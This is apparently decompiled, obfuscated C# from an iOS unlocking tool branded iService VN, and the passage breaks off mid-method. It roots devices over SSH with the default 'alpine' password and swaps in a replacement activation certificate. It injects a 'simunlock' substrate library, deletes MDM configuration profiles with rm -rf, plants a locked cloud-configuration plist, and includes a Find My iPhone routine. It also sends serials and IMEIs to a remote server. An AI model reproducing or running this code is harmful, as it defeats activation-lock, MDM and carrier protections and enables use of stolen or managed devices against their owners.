using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Claunia.PropertyList;
using ICSharpCode.SharpZipLib.GZip;
using ICSharpCode.SharpZipLib.Tar;
using Renci.SshNet;

public class DeviceOperationsRecovered
{
	[CompilerGenerated]
	private sealed class Recovered_02_0015_TypeName
	{
		public MainFormRecovered Recovered_04_006d_Name;

		public int Recovered_04_006e_Name;

		internal void Recovered_06_00cd_Name()
		{
			Recovered_04_006d_Name.Recovered_06_00fc_Name(Recovered_04_006e_Name, Recovered_04_006e_Name.ToString());
		}
	}

	private SshClient Recovered_04_0042_Name;

	private ScpClient Recovered_04_0043_Name;

	public string Recovered_04_0044_Name = "127.0.0.1";

	public string Recovered_04_0045_Name = "alpine";

	public int Recovered_04_0046_Name = 22;

	private string Recovered_04_0047_Name = "";

	private string Recovered_04_0048_Name = "";

	private string Recovered_04_0049_Name = "";

	private string Recovered_04_004a_Name = "/var/mobile/Library/Preferences/";

	private string Recovered_04_004b_Name = "/var/wireless/Library/Preferences/";

	private string Recovered_04_004c_Name = "/var/root/Library/Lockdown/";

	private string Recovered_04_004d_Name = "///activation_record.plist";

	private string Recovered_04_004e_Name = "///com.apple.commcenter.device_specific_nobackup.plist";

	private string Recovered_04_004f_Name = "///data_ark.plist";

	private string Recovered_04_0050_Name = "///data_ark.plist";

	private string Recovered_04_0051_Name = "///com.apple.purplebuddy.plist";

	public static string Recovered_04_0052_Name = Directory.GetCurrentDirectory();

	public static string Recovered_04_0053_Name = Recovered_04_0052_Name + "/vendor/other/";

	public static string Recovered_04_0054_Name = Recovered_04_0052_Name + "/vendor/";

	public static string Recovered_04_0055_Name = "/Command/Downloads/";

	public static string Recovered_04_0056_Name = "/tmp/Backup";

	public static string Recovered_04_0057_Name = Recovered_04_0052_Name + ".\\vendor\\Backup";

	public static string Recovered_04_0058_Name = Recovered_04_0052_Name + ".\\vendor\\Backup\\";

	private string Recovered_04_0059_Name;

	private string Recovered_04_005a_Name = "";

	private string Recovered_04_005b_Name = "";

	private string Recovered_04_005c_Name = "";

	private string Recovered_04_005d_Name = "";

	private bool Recovered_04_005e_Name = true;

	private string Recovered_04_005f_Name;

	private string Recovered_04_0060_Name = "";

	private string TemporaryDirectory = Path.GetTempPath() + "\\";

	public string MdmWorkingDirectory = Path.GetTempPath() + "ikey\\";

	private int Recovered_04_0063_Name = 0;

	private int Recovered_04_0064_Name = 0;

	private static string Recovered_04_0065_Name = Path.GetTempPath();

	private static string Recovered_04_0066_Name = "ikey";

	private static string Recovered_04_0067_Name = Path.Combine(Recovered_04_0065_Name, Recovered_04_0066_Name);

	public static string Recovered_04_0068_Name = Application.StartupPath + "\\vendor\\util\\uikit.tar";

	public static string Recovered_04_0069_Name = Application.StartupPath + "\\vendor\\util\\91.bin";

	public static string Recovered_04_006a_Name = Application.StartupPath + "\\vendor\\util\\BC";

	public static string Recovered_04_006b_Name = Application.StartupPath + "\\vendor\\util\\iuntethered.dylib";

	public static string Recovered_04_006c_Name = Application.StartupPath + "\\vendor\\util\\iuntethered.plist";

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_005b_Name()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			UpdateProgress(5);
			try
			{
				Recovered_06_00c1_Name();
				UpdateProgress(6);
				EnsureDevicePairing();
				UpdateProgress(8);
				ConnectSshOverUsb();
				UpdateProgress(10);
				MountDeviceFilesystem();
				UpdateProgress(12);
				Recovered_06_0096_Name();
				UpdateProgress(14);
				Recovered_06_00b4_Name();
				UpdateProgress(16);
				Recovered_06_00a4_Name();
				UpdateProgress(18);
				Recovered_06_009b_Name();
				UpdateProgress(20);
				Recovered_06_00af_Name();
				UpdateProgress(22);
				Recovered_06_00ad_Name();
				UpdateProgress(24);
			}
			catch (Exception ex)
			{
				Recovered_06_006e_Name(ex);
				return;
			}
			Recovered_04_0063_Name = 2;
			try
			{
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0014_Name, "/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				UpdateProgress(26);
				Recovered_06_009a_Name();
				UpdateProgress(28);
				Recovered_06_0085_Name();
				UpdateProgress(29);
				EnsureDevicePairing();
				UpdateProgress(30);
				bool flag = false;
				int num = 1;
				while (!flag && num <= 5)
				{
					UpdateProgress(30 + num);
					Recovered_06_00b4_Name();
					flag = Recovered_06_0097_Name();
					num++;
					Thread.Sleep(1000);
				}
				if (!flag)
				{
					Recovered_06_0070_Name();
					return;
				}
				UpdateProgress(36);
			}
			catch (Exception ex2)
			{
				Recovered_06_006e_Name(ex2);
				return;
			}
			try
			{
				ExecuteSshCommand("chflags nouchg " + Recovered_04_0051_Name);
				UpdateProgress(38);
				Recovered_06_0096_Name();
				UpdateProgress(42);
				ConnectSshOverUsb();
				UpdateProgress(43);
				MountDeviceFilesystem();
				UpdateProgress(44);
				Recovered_06_0086_Name();
				UpdateProgress(45);
				Recovered_06_00b5_Name();
				UpdateProgress(48);
				Recovered_06_00b6_Name();
				UpdateProgress(50);
				Recovered_06_00b8_Name();
				UpdateProgress(55);
				Recovered_06_00a6_Name();
				UpdateProgress(65);
			}
			catch (Exception ex3)
			{
				Recovered_06_00c1_Name();
				Recovered_06_006e_Name(ex3);
				return;
			}
			Recovered_04_0063_Name = 3;
			try
			{
				Recovered_06_009e_Name();
				UpdateProgress(75);
				Recovered_06_0088_Name();
				UpdateProgress(82);
				Recovered_06_008a_Name();
				UpdateProgress(84);
				Recovered_06_008c_Name();
				UpdateProgress(85);
				Recovered_06_008d_Name();
				UpdateProgress(86);
				Recovered_06_008f_Name();
				UpdateProgress(90);
			}
			catch (Exception ex4)
			{
				if (Recovered_04_0064_Name >= 85)
				{
					Recovered_06_0072_Name();
					UpdateProgress(100);
					Recovered_06_00c1_Name();
				}
				else
				{
					Recovered_06_006e_Name(ex4);
				}
				return;
			}
			Recovered_04_0063_Name = 4;
			try
			{
				Recovered_06_00a5_Name();
				UpdateProgress(94);
				Recovered_06_00c1_Name();
				UpdateProgress(99);
				Recovered_06_0073_Name();
				UpdateProgress(100);
				Recovered_06_0072_Name();
				Recovered_06_00c1_Name();
			}
			catch (Exception)
			{
				Recovered_06_00c1_Name();
			}
			Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
			recovered_02_0010_TypeName.ShowDialog();
			Process.Start("https://iservicevn.com");
		}
		catch (Exception ex6)
		{
			Recovered_06_006e_Name(ex6);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_005c_Name()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			UpdateProgress(5);
			try
			{
				Recovered_06_00c1_Name();
				UpdateProgress(6);
				EnsureDevicePairing();
				UpdateProgress(8);
				ConnectSshOverUsb();
				UpdateProgress(10);
				MountDeviceFilesystem();
				UpdateProgress(12);
				Recovered_06_0096_Name();
				UpdateProgress(14);
				Recovered_06_00b4_Name();
				UpdateProgress(16);
				Recovered_06_00a4_Name();
				UpdateProgress(18);
				Recovered_06_009b_Name();
				UpdateProgress(20);
				Recovered_06_00af_Name();
				UpdateProgress(22);
				Recovered_06_00ad_Name();
				UpdateProgress(24);
			}
			catch (Exception ex)
			{
				Recovered_06_006e_Name(ex);
				return;
			}
			Recovered_04_0063_Name = 2;
			try
			{
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0014_Name, "/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				UpdateProgress(26);
				Recovered_06_009a_Name();
				UpdateProgress(28);
				Recovered_06_0085_Name();
				UpdateProgress(29);
				EnsureDevicePairing();
				UpdateProgress(30);
				bool flag = false;
				int num = 1;
				while (!flag && num <= 5)
				{
					UpdateProgress(30 + num);
					Recovered_06_00b4_Name();
					flag = Recovered_06_0097_Name();
					num++;
					Thread.Sleep(1000);
				}
				if (!flag)
				{
					Recovered_06_0070_Name();
					return;
				}
				UpdateProgress(36);
			}
			catch (Exception ex2)
			{
				Recovered_06_006e_Name(ex2);
				return;
			}
			try
			{
				ExecuteSshCommand("chflags nouchg " + Recovered_04_0051_Name);
				UpdateProgress(38);
				Recovered_06_0096_Name();
				UpdateProgress(42);
				ConnectSshOverUsb();
				UpdateProgress(43);
				MountDeviceFilesystem();
				UpdateProgress(44);
				Recovered_06_0086_Name();
				UpdateProgress(45);
				Recovered_06_00b5_Name();
				UpdateProgress(48);
				Recovered_06_00b7_Name();
				UpdateProgress(50);
				Recovered_06_00b8_Name();
				UpdateProgress(55);
				Recovered_06_00a6_Name();
				UpdateProgress(65);
			}
			catch (Exception ex3)
			{
				Recovered_06_00c1_Name();
				Recovered_06_006e_Name(ex3);
				return;
			}
			Recovered_04_0063_Name = 3;
			try
			{
				Recovered_06_009e_Name();
				UpdateProgress(75);
				Recovered_06_0088_Name();
				UpdateProgress(77);
				Recovered_06_008a_Name();
				UpdateProgress(80);
				UpdateProgress(82);
				Recovered_06_008c_Name();
				UpdateProgress(85);
				Recovered_06_008d_Name();
				UpdateProgress(86);
				Recovered_06_008f_Name();
				UpdateProgress(90);
			}
			catch (Exception ex4)
			{
				if (Recovered_04_0064_Name >= 85)
				{
					Recovered_06_0072_Name();
					UpdateProgress(100);
					Recovered_06_00c1_Name();
				}
				else
				{
					Recovered_06_006e_Name(ex4);
				}
				return;
			}
			Recovered_04_0063_Name = 4;
			try
			{
				Recovered_06_00a5_Name();
				UpdateProgress(94);
				Recovered_06_00c1_Name();
				UpdateProgress(99);
				Recovered_06_0073_Name();
				UpdateProgress(100);
				Recovered_06_0072_Name();
				Recovered_06_00c1_Name();
			}
			catch (Exception)
			{
				Recovered_06_00c1_Name();
			}
			Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
			recovered_02_0010_TypeName.ShowDialog();
			Process.Start("https://iservicevn.com");
		}
		catch (Exception ex6)
		{
			Recovered_06_006e_Name(ex6);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_005d_Name()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			UpdateProgress(5);
			try
			{
				Recovered_06_00c1_Name();
				UpdateProgress(6);
				EnsureDevicePairing();
				UpdateProgress(8);
				ConnectSshOverUsb();
				UpdateProgress(10);
				MountDeviceFilesystem();
				UpdateProgress(12);
				Recovered_06_0096_Name();
				UpdateProgress(14);
				Recovered_06_00b4_Name();
				UpdateProgress(16);
				Recovered_06_00a4_Name();
				UpdateProgress(18);
				Recovered_06_009b_Name();
				UpdateProgress(20);
				Recovered_06_007c_Name();
				UpdateProgress(21);
				Recovered_06_00af_Name();
				UpdateProgress(22);
				Recovered_06_00ad_Name();
				UpdateProgress(24);
			}
			catch (Exception ex)
			{
				Recovered_06_006e_Name(ex);
				return;
			}
			Recovered_04_0063_Name = 2;
			try
			{
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0014_Name, "/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				UpdateProgress(26);
				Recovered_06_009a_Name();
				UpdateProgress(28);
				Recovered_06_0085_Name();
				UpdateProgress(29);
				EnsureDevicePairing();
				UpdateProgress(30);
				bool flag = false;
				int num = 1;
				while (!flag && num <= 5)
				{
					UpdateProgress(30 + num);
					Recovered_06_00b4_Name();
					flag = Recovered_06_0097_Name();
					num++;
					Thread.Sleep(1000);
				}
				if (!flag)
				{
					Recovered_06_0070_Name();
					return;
				}
				UpdateProgress(36);
			}
			catch (Exception ex2)
			{
				Recovered_06_006e_Name(ex2);
				return;
			}
			try
			{
				ExecuteSshCommand("chflags nouchg " + Recovered_04_0051_Name);
				UpdateProgress(38);
				Recovered_06_0096_Name();
				UpdateProgress(42);
				ConnectSshOverUsb();
				UpdateProgress(43);
				MountDeviceFilesystem();
				UpdateProgress(44);
				Recovered_06_0086_Name();
				UpdateProgress(45);
				Recovered_06_00b5_Name();
				UpdateProgress(48);
				Recovered_06_00b7_Name();
				UpdateProgress(50);
				Recovered_06_00b8_Name();
				UpdateProgress(55);
				Recovered_06_00a6_Name();
				UpdateProgress(65);
			}
			catch (Exception ex3)
			{
				Recovered_06_00c1_Name();
				Recovered_06_006e_Name(ex3);
				return;
			}
			Recovered_04_0063_Name = 3;
			try
			{
				Recovered_06_009e_Name();
				UpdateProgress(75);
				Recovered_06_0088_Name();
				UpdateProgress(77);
				Recovered_06_008a_Name();
				UpdateProgress(80);
				UpdateProgress(82);
				Recovered_06_007d_Name();
				UpdateProgress(84);
				Recovered_06_008c_Name();
				UpdateProgress(85);
				Recovered_06_008d_Name();
				UpdateProgress(86);
				Recovered_06_008f_Name();
				UpdateProgress(90);
			}
			catch (Exception ex4)
			{
				if (Recovered_04_0064_Name >= 85)
				{
					Recovered_06_0072_Name();
					UpdateProgress(100);
					Recovered_06_00c1_Name();
				}
				else
				{
					Recovered_06_006e_Name(ex4);
				}
				return;
			}
			Recovered_04_0063_Name = 4;
			try
			{
				Recovered_06_00a5_Name();
				UpdateProgress(94);
				UpdateProgress(95);
				MountDeviceFilesystem();
				UpdateProgress(97);
				UpdateProgress(98);
				Recovered_06_00c1_Name();
				UpdateProgress(99);
				Recovered_06_0073_Name();
				UpdateProgress(100);
				Recovered_06_0072_Name();
				Recovered_06_00c1_Name();
			}
			catch (Exception)
			{
				Recovered_06_00c1_Name();
			}
			Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
			recovered_02_0010_TypeName.ShowDialog();
			Process.Start("https://iservicevn.com");
		}
		catch (Exception ex6)
		{
			Recovered_06_006e_Name(ex6);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_005e_Name()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			UpdateProgress(5);
			try
			{
				Recovered_06_00c1_Name();
				UpdateProgress(6);
				EnsureDevicePairing();
				UpdateProgress(8);
				ConnectSshOverUsb();
				UpdateProgress(10);
				MountDeviceFilesystem();
				UpdateProgress(12);
				Recovered_06_0096_Name();
				UpdateProgress(14);
				Recovered_06_0087_Name();
				UpdateProgress(15);
				Recovered_06_00b4_Name();
				UpdateProgress(16);
				Recovered_06_00a4_Name();
				UpdateProgress(18);
				Recovered_06_009b_Name();
				UpdateProgress(20);
				Recovered_06_00af_Name();
				UpdateProgress(22);
				Recovered_06_00ad_Name();
				UpdateProgress(24);
			}
			catch (Exception ex)
			{
				Recovered_06_006e_Name(ex);
				return;
			}
			Recovered_04_0063_Name = 2;
			try
			{
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0014_Name, "/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				UpdateProgress(26);
				Recovered_06_009a_Name();
				UpdateProgress(28);
				Recovered_06_0085_Name();
				UpdateProgress(29);
				EnsureDevicePairing();
				UpdateProgress(30);
				bool flag = false;
				int num = 1;
				while (!flag && num <= 5)
				{
					UpdateProgress(30 + num);
					Recovered_06_00b4_Name();
					flag = Recovered_06_0097_Name();
					num++;
					Thread.Sleep(1000);
				}
				if (!flag)
				{
					Recovered_06_0070_Name();
					return;
				}
				UpdateProgress(36);
			}
			catch (Exception ex2)
			{
				Recovered_06_006e_Name(ex2);
				return;
			}
			try
			{
				ExecuteSshCommand("chflags nouchg " + Recovered_04_0051_Name);
				UpdateProgress(38);
				Recovered_06_0096_Name();
				UpdateProgress(42);
				Recovered_06_009b_Name();
				UpdateProgress(44);
				Recovered_06_00af_Name();
				UpdateProgress(46);
				ConnectSshOverUsb();
				UpdateProgress(52);
				MountDeviceFilesystem();
				UpdateProgress(58);
				Recovered_06_00a7_Name();
				UpdateProgress(65);
			}
			catch (Exception ex3)
			{
				Recovered_06_00c1_Name();
				Recovered_06_006e_Name(ex3);
				return;
			}
			Recovered_04_0063_Name = 3;
			try
			{
				Recovered_06_009e_Name();
				UpdateProgress(75);
				Recovered_06_0088_Name();
				UpdateProgress(82);
				Recovered_06_008a_Name();
				UpdateProgress(84);
				Recovered_06_008c_Name();
				UpdateProgress(85);
				Recovered_06_008d_Name();
				UpdateProgress(86);
				Recovered_06_008f_Name();
				UpdateProgress(90);
			}
			catch (Exception ex4)
			{
				if (Recovered_04_0064_Name >= 85)
				{
					Recovered_06_0072_Name();
					UpdateProgress(100);
					Recovered_06_00c1_Name();
				}
				else
				{
					Recovered_06_006e_Name(ex4);
				}
				return;
			}
			Recovered_04_0063_Name = 4;
			try
			{
				Recovered_06_00a5_Name();
				UpdateProgress(94);
				Recovered_06_00c1_Name();
				UpdateProgress(99);
				Recovered_06_0073_Name();
				UpdateProgress(100);
				Recovered_06_0072_Name();
				Recovered_06_00c1_Name();
			}
			catch (Exception)
			{
				Recovered_06_00c1_Name();
			}
			Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
			recovered_02_0010_TypeName.ShowDialog();
			Process.Start("https://iservicevn.com");
		}
		catch (Exception)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_005f_Name()
	{
		string deviceUDID = DeviceStateRecovered.DeviceUDID;
		if (MessageBox.Show("Step 1: Delete All Videos, Photos, Apps for Save Time\nStep 2: Please Turn Off-On Game Center\nStep 3: Turn Off Wifi then Press Yes\n\nProcess May Take a While, Please Patients...", "Follow Guide !!!", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
		{
			try
			{
				Recovered_06_00c2_Name();
				UpdateProgress(20);
				Recovered_06_00c3_Name();
				UpdateProgress(40);
				Recovered_06_00c4_Name();
				UpdateProgress(60);
				Recovered_06_00c5_Name();
				UpdateProgress(70);
				Recovered_06_00c6_Name();
				UpdateProgress(80);
				Recovered_06_00c7_Name();
				UpdateProgress(90);
				string text = Recovered_06_00aa_Name();
				UpdateProgress(100);
				MessageBox.Show(text, "FMI OPEN MENU", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				Recovered_06_00c2_Name();
				return;
			}
			catch (Exception ex)
			{
				Recovered_06_00c2_Name();
				MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
		}
		UpdateProgress(100);
		MessageBox.Show("Process Cancelled by User", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0060_Name()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			UpdateProgress(5);
			try
			{
				Recovered_06_00c1_Name();
				EnsureDevicePairing();
				UpdateProgress(10);
				ConnectSshOverUsb();
				UpdateProgress(20);
				MountDeviceFilesystem();
				UpdateProgress(30);
				Recovered_06_00c0_Name();
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/uikit.tar", "/uikit.tar");
				ExecuteSshCommand("cd / && tar -xvf uikit.tar && chmod 755 /usr/bin/*");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/9A", "/tmp/boot.tar.lzma");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/BC", "/sbin/lzma");
				UpdateProgress(40);
				ExecuteSshCommand("chmod 755 /sbin/lzma");
				ExecuteSshCommand("lzma -d -v /tmp/boot.tar.lzma");
				ExecuteSshCommand("tar -C / -xvf /tmp/boot.tar && rm -r /tmp/boot.tar");
				ExecuteSshCommand("chmod 755 /usr/libexec/substrate && /usr/libexec/substrate");
				ExecuteSshCommand("chmod 755 /usr/libexec/substrated && /usr/libexec/substrated");
				ExecuteSshCommand("killall -9 backboardd");
				UpdateProgress(50);
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0015_Name, "/Library/MobileSubstrate/DynamicLibraries/simunlock.dylib");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0016_Name, "/Library/MobileSubstrate/DynamicLibraries/simunlock.plist");
				Recovered_06_00b3_Name(Recovered_04_0053_Name + "hash", "/tmp/rsim_simlock_hash");
				UpdateProgress(60);
				Recovered_06_00b4_Name();
				Recovered_06_00c1_Name();
				ExecuteSshCommand("killall -9 SpringBoard mobileactivationd");
				UpdateProgress(80);
				Recovered_06_0098_Name();
				ExecuteSshCommand("rm /Library/MobileSubstrate/DynamicLibraries/simunlock.dylib && rm /Library/MobileSubstrate/DynamicLibraries/simunlock.plist");
				ExecuteSshCommand("rm -rf /tmp/rsim_simlock_hash");
				UpdateProgress(84);
				Recovered_06_00a5_Name();
				UpdateProgress(90);
				ExecuteSshCommand("killall -9 SpringBoard mobileactivationd");
				UpdateProgress(96);
				UpdateProgress(100);
			}
			catch (Exception ex)
			{
				Recovered_06_006e_Name(ex);
				return;
			}
			MessageBox.Show("Your Phone Successfully Carrier Unlocked !\nYou Can OTA UPDATE, But Can't Restore", "[Activation Successfully!]", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception ex2)
		{
			Recovered_06_006e_Name(ex2);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void RunMdmOverSsh_Unreferenced()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			UpdateProgress(5);
			try
			{
				EnsureDevicePairing();
				UpdateProgress(10);
				ConnectSshOverUsb();
				UpdateProgress(20);
				MountDeviceFilesystem();
				UpdateProgress(30);
				ExecuteSshCommand("rm -rf /var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/*");
				UpdateProgress(60);
				ExecuteSshCommand("killall backboardd && sleep 7");
				UpdateProgress(80);
				UploadResourceViaScp(ApplicationResourcesRecovered.MdmConfigurationTemplate, "/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/CloudConfigurationDetails.plist");
				UpdateProgress(84);
				ExecuteSshCommand("chflags uchg /var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/CloudConfigurationDetails.plist");
				UpdateProgress(90);
				ExecuteSshCommand("killall backboardd");
				UpdateProgress(96);
				UpdateProgress(100);
			}
			catch (Exception ex)
			{
				Recovered_06_006e_Name(ex);
				return;
			}
			Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
			recovered_02_0010_TypeName.ShowDialog();
		}
		catch (Exception ex2)
		{
			Recovered_06_006e_Name(ex2);
		}
	}

	public void RunMdmBackupRestore()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			UpdateProgress(5);
			try
			{
				EnsureDevicePairing();
				UpdateProgress(10);
				UpdateProgress(20);
				DeleteMdmWorkingDirectory();
				UpdateProgress(30);
				ExtractMdmToolsArchive();
				UpdateProgress(40);
				ExtractMdmBackupArchive();
				UpdateProgress(60);
				WriteMdmInfoPlist();
				UpdateProgress(80);
				WriteMdmManifestPlist();
				UpdateProgress(84);
				RunMdmSetupProcess();
				UpdateProgress(90);
				DeleteMdmWorkingDirectory();
				UpdateProgress(96);
				UpdateProgress(100);
			}
			catch (Exception ex)
			{
				Recovered_06_006f_Name(ex);
				return;
			}
			Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
			recovered_02_0010_TypeName.ShowDialog();
		}
		catch (Exception ex2)
		{
			Recovered_06_006f_Name(ex2);
		}
	}

	public static void DeleteMdmWorkingDirectory()
	{
		if (Directory.Exists(Recovered_04_0067_Name))
		{
			Directory.Delete(Recovered_04_0067_Name, recursive: true);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string RegisterMdmSerial_Unreferenced()
	{
		try
		{
			string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
			string requestUriString = "http://iservicevn.com/yertgyaerguergkuedrteheth/actmdm/addsntomdm.php?Serial=" + deviceSerialNumber;
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = 12000;
			string result;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				result = streamReader.ReadToEnd();
			}
			return result;
		}
		catch (Exception ex)
		{
			if (DeviceStateRecovered.DiagnosticMode)
			{
				Console.WriteLine(ex.ToString());
			}
			return "CONECTION_ERROR";
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string ResolveMdmInfoEndpoint()
	{
		try
		{
			string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
			string requestUriString = "http://iservicevn.com/tmgsm/infomdm.php?serialNumber=" + deviceSerialNumber;
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = 12000;
			string result;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				result = streamReader.ReadToEnd();
			}
			return result;
		}
		catch (Exception ex)
		{
			if (DeviceStateRecovered.DiagnosticMode)
			{
				Console.WriteLine(ex.ToString());
			}
			return "CONECTION_ERROR";
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string ResolveMdmManifestEndpoint()
	{
		try
		{
			string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
			string requestUriString = "http://iservicevn.com/tmgsm/manifestmdm.php?serialNumber=" + deviceSerialNumber;
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = 12000;
			string result;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				result = streamReader.ReadToEnd();
			}
			return result;
		}
		catch (Exception ex)
		{
			if (DeviceStateRecovered.DiagnosticMode)
			{
				Console.WriteLine(ex.ToString());
			}
			return "CONECTION_ERROR";
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ExtractMdmToolsArchive()
	{
		File.WriteAllBytes(TemporaryDirectory + "iMAzQFikAhTIzL7A0v721A.zip", ApplicationResourcesRecovered.MdmToolsZip);
		ZipFile.ExtractToDirectory(TemporaryDirectory + "iMAzQFikAhTIzL7A0v721A.zip", TemporaryDirectory + "ikey");
		File.Delete(TemporaryDirectory + "iMAzQFikAhTIzL7A0v721A.zip");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void ExtractMdmBackupArchive()
	{
		File.WriteAllBytes(MdmWorkingDirectory + "OJxWZyJe2pncvzRszH2HA.zip", ApplicationResourcesRecovered.MdmBackupZip);
		ZipFile.ExtractToDirectory(MdmWorkingDirectory + "OJxWZyJe2pncvzRszH2HA.zip", MdmWorkingDirectory + DeviceStateRecovered.DeviceUDID);
		File.Delete(MdmWorkingDirectory + "OJxWZyJe2pncvzRszH2HA.zip");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void RunMdmSetupProcess()
	{
		using Process process = new Process();
		process.StartInfo.FileName = MdmWorkingDirectory + "MDM_SETUP.exe";
		process.StartInfo.Arguments = "";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardOutput.ReadToEnd();
		process.WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void WriteMdmInfoPlist()
	{
		string requestUriString = ResolveMdmInfoEndpoint();
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		string deviceIMEI = DeviceStateRecovered.DeviceIMEI;
		string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
		string deviceUDID = DeviceStateRecovered.DeviceUDID;
		string deviceProductType = DeviceStateRecovered.DeviceProductType;
		string deviceProductVersion = DeviceStateRecovered.DeviceProductVersion;
		string unpopulatedMetadata = DeviceStateRecovered.UnpopulatedMetadata5;
		string unpopulatedMetadata2 = DeviceStateRecovered.UnpopulatedMetadata6;
		string text = "thing1=" + Uri.EscapeDataString((deviceSerialNumber != null) ? (deviceSerialNumber ?? "") : "");
		text = text + "&thing2=" + Uri.EscapeDataString((deviceUDID != null) ? (deviceUDID ?? "") : "");
		text = text + "&thing3=" + Uri.EscapeDataString((deviceProductType != null) ? (deviceProductType ?? "") : "");
		text = text + "&thing4=" + Uri.EscapeDataString((deviceProductVersion != null) ? (deviceProductVersion ?? "") : "");
		text = text + "&thing5=" + Uri.EscapeDataString((unpopulatedMetadata != null) ? (unpopulatedMetadata ?? "") : "");
		text = text + "&thing6=" + Uri.EscapeDataString((unpopulatedMetadata2 != null) ? (unpopulatedMetadata2 ?? "") : "");
		text = text + "&thing7=" + Uri.EscapeDataString((deviceIMEI != null) ? (deviceIMEI ?? "") : "");
		byte[] bytes = Encoding.ASCII.GetBytes(text);
		httpWebRequest.ProtocolVersion = HttpVersion.Version11;
		httpWebRequest.Accept = "/";
		httpWebRequest.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-us");
		string text2 = "REDACTED_VENDOR_CREDENTIAL";
		string text3 = "REDACTED_VENDOR_CREDENTIAL";
		string text4 = Convert.ToBase64String(Encoding.ASCII.GetBytes(text2 + ":" + text3));
		httpWebRequest.Headers.Add("Authorization", "Basic " + text4);
